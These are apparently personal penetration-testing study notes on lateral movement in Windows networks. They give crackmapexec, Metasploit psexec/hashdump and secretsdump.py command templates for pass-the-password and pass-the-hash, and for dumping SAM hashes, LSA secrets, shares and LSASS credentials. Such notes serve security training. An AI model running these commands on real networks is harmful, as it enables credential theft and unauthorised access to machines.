- Lateral Movement with a `password` or `hash`
- ![[Pasted image 20250329152310.png]]
- After gaining one password/hash, we can **==try the credentials on every device==** and see if we can login on that.

# Crackmapexec
---
- **Pass the Password**
---
- Using `crackmapexec`:
	- `crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>`
- To grab local hashes:
	- Using `metasploit`:
		- `use exploit/smb/psexec`
		- `hashdump`
	- Using `secretsdump.py`
		- `secretsdump.py <domain>/<username>:<password>@<ip>`
		  
- **Pass the Hash**
- --
- `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth`

- Dump the SAM: 
---
- `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam`

- Grab the share:
---
-  `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --shares

- Dumping LSA (Local Security Authority)
- ---
-  `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --lsa

- Bultin modules
- ---
- ![[Pasted image 20250329153420.png]]
-  `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M lssasy` => Dumps lsass with lsassy
	- ==LSASS is responsible for **forcing security policy** and **stores credentials of logged in users.**==

- `CMEDB`